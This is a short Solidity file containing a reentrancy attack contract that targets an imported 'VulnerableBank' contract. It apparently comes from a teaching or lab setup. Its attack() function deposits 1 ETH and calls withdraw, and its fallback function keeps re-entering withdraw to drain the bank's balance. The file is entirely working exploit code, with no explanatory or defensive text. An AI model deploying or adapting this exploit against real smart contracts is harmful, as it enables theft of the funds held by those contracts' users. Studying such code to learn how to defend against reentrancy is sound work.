// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "./VulnerableBank.sol";

contract ReentrancyAttacker {
    VulnerableBank public vulnerableBank;

    constructor(address _bank) {
        vulnerableBank = VulnerableBank(_bank);
    }

    fallback() external payable {
        if (address(vulnerableBank).balance >= 1 ether) {
            vulnerableBank.withdraw();
        }
    }

    function attack() public payable {
        require(msg.value >= 1 ether, "Send at least 1 ETH");

        vulnerableBank.deposit{value: 1 ether}();
        vulnerableBank.withdraw(); // Triggers fallback
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
